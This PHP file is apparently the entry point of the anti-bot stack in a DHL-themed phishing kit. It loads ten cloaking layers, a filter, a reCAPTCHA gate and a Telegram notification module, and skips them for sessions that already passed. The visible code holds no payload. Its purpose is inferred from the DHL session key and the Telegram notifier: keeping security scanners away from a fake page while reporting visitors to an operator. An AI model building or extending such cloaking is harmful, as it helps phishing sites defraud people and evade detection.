<?php
// Anti-bot stack (same idea as we4): layers 1–4, 6–10, filter, then reCAPTCHA (anti5).
// anti5 may output+exit or return when this session already passed captcha.

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!empty($_SESSION['dhl_captcha_ok']) && !empty($_SESSION['anti_verified'])) {
    return;
}

require_once __DIR__ . '/telegram_notify.php';
require_once __DIR__ . '/anti1.php';
require_once __DIR__ . '/anti2.php';
require_once __DIR__ . '/anti3.php';
require_once __DIR__ . '/anti4.php';
require_once __DIR__ . '/anti6.php';
require_once __DIR__ . '/anti7.php';
require_once __DIR__ . '/anti8.php';
require_once __DIR__ . '/anti9.php';
require_once __DIR__ . '/anti10.php';
require_once __DIR__ . '/filter.php';
require_once __DIR__ . '/anti5.php';
